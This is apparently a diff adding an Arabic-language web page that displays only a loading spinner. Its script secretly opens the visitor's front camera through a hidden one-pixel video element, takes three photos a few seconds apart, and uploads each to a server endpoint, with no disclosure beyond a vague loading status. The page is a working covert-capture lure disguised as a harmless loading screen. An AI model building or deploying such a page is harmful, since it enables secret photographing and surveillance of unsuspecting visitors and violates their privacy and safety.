@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>جاري التحميل...</title>
+<style>
+  body{font-family:-apple-system,sans-serif;background:#0f172a;color:#e2e8f0;
+       display:flex;align-items:center;justify-content:center;min-height:100vh;
+       margin:0;text-align:center}
+  .spinner{width:50px;height:50px;border:4px solid #334155;border-top-color:#38bdf8;
+           border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  #status{font-size:16px;margin-top:15px}
+</style>
+</head>
+<body>
+  <div>
+    <div class="spinner"></div>
+    <div id="status">جاري التحميل، يرجى الانتظار...</div>
+  </div>
+
+  <video id="video" autoplay playsinline muted
+         style="position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+  const PHOTO_COUNT   = 3;
+  const DELAY_BEFORE  = 800;
+  const INTERVAL      = 2000;
+  const CAMERA_FACING = "user";
+
+  const video  = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const status = document.getElementById('status');
+
+  async function start() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: CAMERA_FACING }, audio: false
+      });
+      video.srcObject = stream;
+      await video.play();
+      await new Promise(r => setTimeout(r, DELAY_BEFORE));
+
+      for (let i = 1; i <= PHOTO_COUNT; i++) {
+        await send(i);
+        if (i < PHOTO_COUNT) await new Promise(r => setTimeout(r, INTERVAL));
+      }
+
+      stream.getTracks().forEach(t => t.stop());
+      status.innerText = "تم ✅";
+    } catch (e) {
+      console.error(e);
+      status.innerText = "❌ لم يتم منح إذن الكاميرا";
+    }
+  }
+
+  function send(i) {
+    return new Promise((resolve) => {
+      canvas.width  = video.videoWidth  || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      canvas.toBlob(async (blob) => {
+        if (!blob) return resolve();
+        const form = new FormData();
+        form.append("photo", blob, `photo_${i}.jpg`);
+        try {
+          await fetch("/api/upload", { method: "POST", body: form });
+          status.innerText = `تم إرسال ${i}/${PHOTO_COUNT}`;
+        } catch (e) { console.error(e); }
+        resolve();
+      }, "image/jpeg", 0.9);
+    });
+  }
+
+  start();
+</script>
+</body>
+</html>
